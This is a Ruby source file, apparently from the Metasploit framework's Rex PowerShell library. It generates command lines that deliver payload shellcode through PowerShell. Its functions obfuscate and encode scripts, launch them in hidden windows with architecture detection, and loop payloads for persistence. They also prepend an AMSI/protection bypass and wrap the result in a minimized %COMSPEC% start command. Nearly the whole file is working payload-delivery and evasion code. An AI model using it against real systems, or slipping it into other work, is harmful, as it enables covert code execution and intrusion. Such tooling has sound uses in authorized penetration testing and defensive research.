# -*- coding: binary -*-

module Rex
module Powershell
module Command
  #
  # Return an encoded powershell script
  # Will invoke PSH modifiers as enabled
  #
  # @param script_in [String] Script contents
  # @param opts [Hash] The options for encoding
  # @option opts [Bool] :strip_comments Strip comments
  # @option opts [Bool] :strip_whitespace Strip whitespace
  # @option opts [Bool] :sub_vars Substitute variable names
  # @option opts [Bool] :sub_funcs Substitute function names
  #
  # @return [String] Encoded script
  def self.encode_script(script_in, eof=nil, opts={})
    # Build script object
    psh = Rex::Powershell::Script.new(script_in)
    psh.strip_comments if opts[:strip_comments]
    psh.strip_whitespace if opts[:strip_whitespace]
    psh.sub_vars if opts[:sub_vars]
    psh.sub_funcs if opts[:sub_funcs]
    psh.encode_code(eof)
  end

  #
  # Return the ASCII contents of the base64 encoded script
  #
  # @param script_in [String] Encoded script
  #
  # @return [String] Decoded script
  def self.decode_script(script_in)
    Rex::Powershell::Script.new(script_in).decode_code
  end

  #
  # Return a gzip compressed powershell script
  # Will invoke PSH modifiers as enabled
  #
  # @param script_in [String] Script contents
  # @param eof [String] Marker to indicate the end of file appended to script
  # @param opts [Hash] The options for encoding
  # @option opts [Bool] :strip_comments Strip comments
  # @option opts [Bool] :strip_whitespace Strip whitespace
  # @option opts [Bool] :sub_vars Substitute variable names
  # @option opts [Bool] :sub_funcs Substitute function names
  #
  # @return [String] Compressed script with decompression stub
  def self.compress_script(script_in, eof=nil, opts={})
    # Build script object
    psh = Rex::Powershell::Script.new(script_in)
    psh.strip_comments if opts[:strip_comments]
    psh.strip_whitespace if opts[:strip_whitespace]
    psh.sub_vars if opts[:sub_vars]
    psh.sub_funcs if opts[:sub_funcs]
    psh.compress_code(eof)
  end

  #
  # Return the ASCII contents of the GZIP/Deflate compressed script
  #
  # @param script_in [String] Compressed script
  #
  # @return [String] Decompressed script
  def self.decompress_script(script_in)
    Rex::Powershell::Script.new(script_in).decompress_code
  end

  #
  # Generate a powershell command line, options are passed on to
  # generate_psh_args
  #
  # @param opts [Hash] The options to generate the command line
  # @option opts [String] :path Path to the powershell binary
  # @option opts [Boolean] :no_full_stop Whether powershell binary
  #   should include .exe
  #
  # @return [String] Powershell command line with arguments
  def self.generate_psh_command_line(opts)
    if opts[:path] and (opts[:path][-1, 1] != '\\')
      opts[:path] << '\\'
    end

    if opts[:no_full_stop]
      binary = 'powershell'
    else
      binary = 'powershell.exe'
    end

    args = generate_psh_args(opts)

    "#{opts[:path]}#{binary} #{args}"
  end

  #
  # Generate arguments for the powershell command
  # The format will be have no space at the start and have a space
  # afterwards e.g. "-Arg1 x -Arg -Arg x "
  #
  # @param opts [Hash] The options to generate the command line
  # @option opts [Boolean] :shorten Whether to shorten the powershell
  #   arguments (v2.0 or greater)
  # @option opts [String] :encodedcommand Powershell script as an
  #   encoded command (-EncodedCommand)
  # @option opts [String] :executionpolicy The execution policy
  #   (-ExecutionPolicy)
  # @option opts [String] :inputformat The input format (-InputFormat)
  # @option opts [String] :file The path to a powershell file (-File)
  # @option opts [Boolean] :noexit Whether to exit powershell after
  #   execution (-NoExit)
  # @option opts [Boolean] :nologo Whether to display the logo (-NoLogo)
  # @option opts [Boolean] :noninteractive Whether to load a non
  #   interactive powershell (-NonInteractive)
  # @option opts [Boolean] :mta Whether to run as Multi-Threaded
  #   Apartment (-Mta)
  # @option opts [String] :outputformat The output format
  #   (-OutputFormat)
  # @option opts [Boolean] :sta Whether to run as Single-Threaded
  #   Apartment (-Sta)
  # @option opts [Boolean] :noprofile Whether to use the current users
  #   powershell profile (-NoProfile)
  # @option opts [String] :windowstyle The window style to use
  #   (-WindowStyle)
  #
  # @return [String] Powershell command arguments
  def self.generate_psh_args(opts)
    return '' unless opts

    unless opts.key? :shorten
      opts[:shorten] = (opts[:method] != 'old')
    end

    arg_string = ' '
    opts.each_pair do |arg, value|
      case arg
        when :executionpolicy
          arg_string << "-ExecutionPolicy #{value} " if value
        when :inputformat
          arg_string << "-InputFormat #{value} " if value
        when :file
          arg_string << "-File #{value} " if value
        when :noexit
          arg_string << '-NoExit ' if value
        when :nologo
          arg_string << '-NoLogo ' if value
        when :noninteractive
          arg_string << '-NonInteractive ' if value
        when :mta
          arg_string << '-Mta ' if value
        when :outputformat
          arg_string << "-OutputFormat #{value} " if value
        when :sta
          arg_string << '-Sta ' if value
        when :noprofile
          arg_string << '-NoProfile ' if value
        when :windowstyle
          arg_string << "-WindowStyle #{value} " if value
        when :usev2
          arg_string.prepend(" -Version 2") if value
      end
    end

    # Command must be last (unless from stdin - etc)
    if opts[:command]
      if opts[:wrap_double_quotes]
        arg_string << "-Command \"#{opts[:command]}\""
      else
        arg_string << "-Command #{opts[:command]}"
      end
    elsif opts[:encodedcommand]
      arg_string << "-EncodedCommand #{opts[:encodedcommand]}"
    end

    # Shorten arg if PSH 2.0+
    if opts[:shorten]
      # Invoke-Command and Out-File require these options to have
      # an additional space before to prevent Powershell code being
      # mangled.
      arg_string.gsub!(' -Command ', ' -c ')
      arg_string.gsub!('-EncodedCommand ', '-e ')
      arg_string.gsub!('-ExecutionPolicy ', '-ep ')
      arg_string.gsub!(' -File ', ' -f ')
      arg_string.gsub!('-InputFormat ', '-i ')
      arg_string.gsub!('-NoExit ', '-noe ')
      arg_string.gsub!('-NoLogo ', '-nol ')
      arg_string.gsub!('-NoProfile ', '-nop ')
      arg_string.gsub!('-NonInteractive ', '-noni ')
      arg_string.gsub!('-OutputFormat ', '-o ')
      arg_string.gsub!('-Sta ', '-s ')
      arg_string.gsub!('-WindowStyle ', '-w ')
      arg_string.gsub!(' -Version ', ' -v ')
    end

    # Strip off first space character
    arg_string = arg_string[1..-1]
    # Remove final space character
    arg_string = arg_string[0..-2] if (arg_string[-1] == ' ')

    arg_string
  end

  #
  # Wraps the powershell code to launch a hidden window and
  # detect the execution environment and spawn the appropriate
  # powershell executable for the payload architecture.
  #
  # @param ps_code [String] Powershell code
  # @param payload_arch [String] The payload architecture 'x86'/'x86_64'
  # @param encoded [Boolean] Indicates whether ps_code is encoded or not
  # @param opts [Hash] The options for generate_psh_args
  #
  # @return [String] Wrapped powershell code
  def self.run_hidden_psh(ps_code, payload_arch, encoded, opts={})
    opts[:noprofile] ||= 'true'
    opts[:windowstyle] ||= 'hidden'

    # Old method needs host process to stay open
    opts[:noexit] = true if (opts[:method] == 'old')

    if encoded
      opts[:encodedcommand] = ps_code
    else
      opts[:command] = ps_code.gsub("'", "''")
      opts[:wrap_double_quotes]  = false
    end

    process_start_info = <<EOS
$s=New-Object System.Diagnostics.ProcessStartInfo
$s.FileName=$b
$s.Arguments='#{generate_psh_args(opts)}'
$s.UseShellExecute=$false
$s.RedirectStandardOutput=$true
$s.WindowStyle='Hidden'
$s.CreateNoWindow=$true
$p=[System.Diagnostics.Process]::Start($s)
EOS
    process_start_info.gsub!("\n", ';')

    archictecure_detection = <<EOS
if([IntPtr]::Size -eq 4){
#{payload_arch == 'x86' ? "$b='powershell.exe'" : "$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'"}
}else{
#{payload_arch == 'x86' ? "$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" : "$b='powershell.exe'"}
};
EOS

    archictecure_detection.gsub!("\n", '')

    if opts[:no_arch_detect]
      return   "$b='powershell.exe';#{process_start_info}"
    else
      archictecure_detection + process_start_info
    end
  end

  #
  # Creates a powershell command line string which will execute the
  # payload in a hidden window in the appropriate execution environment
  # for the payload architecture. Opts are passed through to
  # run_hidden_psh, generate_psh_command_line and generate_psh_args
  #
  # @param pay [String] The payload shellcode
  # @param payload_arch [String] The payload architecture 'x86'/'x86_64'
  # @param opts [Hash] The options to generate the command
  # @option opts [Boolean] :persist Loop the payload to cause
  #   re-execution if the shellcode finishes
  # @option opts [Integer] :prepend_sleep Sleep for the specified time
  #   before executing the payload
  # @option opts [String] :method The powershell injection technique to
  #   use: 'net'/'reflection'/'old'
  # @option opts [Boolean] :encode_inner_payload Encodes the powershell
  #   script within the hidden/architecture detection wrapper
  # @option opts [Boolean] :encode_final_payload Encodes the final
  #   powershell script
  # @option opts [Boolean] :remove_comspec Removes the %COMSPEC%
  #   environment variable at the start of the command line
  # @option opts [Boolean] :wrap_double_quotes Wraps the -Command
  #   argument in double quotes unless :encode_final_payload
  # @option opts [TrueClass,FalseClass] :exec_in_place Removes the
  #   executable wrappers from the powershell code returning raw PSH
  #   for executing with an existing PSH context
  #
  # @return [String] Powershell command line with payload
  def self.cmd_psh_payload(pay, payload_arch, template_path, opts = {})
    if opts[:encode_inner_payload] && opts[:encode_final_payload]
      fail RuntimeError, ':encode_inner_payload and :encode_final_payload are incompatible options'
    end

    if opts[:no_equals] && !opts[:encode_final_payload]
      fail RuntimeError, ':no_equals requires :encode_final_payload option to be used'
    end

    psh_payload = case opts[:method]
      when 'net'
        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, pay)
      when 'reflection'
        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, pay)
      when 'old'
        Rex::Powershell::Payload.to_win32pe_psh(template_path, pay)
      when 'msil'
        Rex::Powershell::Payload.to_win32pe_psh_msil(template_path, pay)
      else
        fail RuntimeError, 'No Powershell method specified'
    end

    # Run our payload in a while loop
    if opts[:persist]
      fun_name = Rex::Text.rand_text_alpha(rand(2) + 2)
      sleep_time = rand(5) + 5
      psh_payload  = "function #{fun_name}{#{psh_payload}};"
      psh_payload << "while(1){Start-Sleep -s #{sleep_time};#{fun_name};1};"
    end

    if opts[:prepend_sleep]
      if opts[:prepend_sleep].to_i > 0
        psh_payload = "Start-Sleep -s #{opts[:prepend_sleep]};" << psh_payload
      end
    end

    compressed_payload = compress_script(psh_payload, nil, opts)

    if opts[:prepend_protections_bypass]
      bypass_amsi = Rex::Powershell::PshMethods.bypass_powershell_protections
      compressed_payload = bypass_amsi + ";" + compressed_payload
    end

    encoded_payload = encode_script(psh_payload, opts)

    # This branch is probably never taken...
    if encoded_payload.length <= compressed_payload.length
      smallest_payload = encoded_payload
      encoded = true
    else
      if opts[:encode_inner_payload]
        encoded = true
        compressed_encoded_payload = encode_script(compressed_payload)

        if encoded_payload.length <= compressed_encoded_payload.length
          smallest_payload = encoded_payload
        else
          smallest_payload = compressed_encoded_payload
        end
      else
        smallest_payload = compressed_payload
        encoded = false
      end
    end

    if opts[:exec_in_place]
      final_payload = smallest_payload
    else
      # Wrap in hidden runtime / architecture detection
      inner_args = opts.clone
      inner_args[:wrap_double_quotes] = true
      final_payload = run_hidden_psh(smallest_payload, payload_arch, encoded, inner_args)
    end

    command_args = {
        noprofile: true,
        windowstyle: 'hidden'
    }.merge(opts)

    if opts[:encode_final_payload]
      command_args[:encodedcommand] = encode_script(final_payload)
      # If '=' is a bad character pad the payload until Base64 encoded
      # payload contains none.
      if opts[:no_equals]
        while command_args[:encodedcommand].include? '='
          final_payload << ' '
          command_args[:encodedcommand] = encode_script(final_payload)
        end
      end
    else
      command_args[:command] = final_payload
    end
    psh_command =  generate_psh_command_line(command_args)

    if opts[:exec_in_place] and (not opts[:encode_final_payload] and not opts[:encode_inner_payload])
      command = final_payload
    elsif opts[:remove_comspec]
      command = psh_command
    else
      command = "%COMSPEC% /b /c start /b /min #{psh_command}"
    end

    if command.length > 8191
      fail RuntimeError, 'Powershell command length is greater than the command line maximum (8192 characters)'
    end

    command
  end
end
end
end
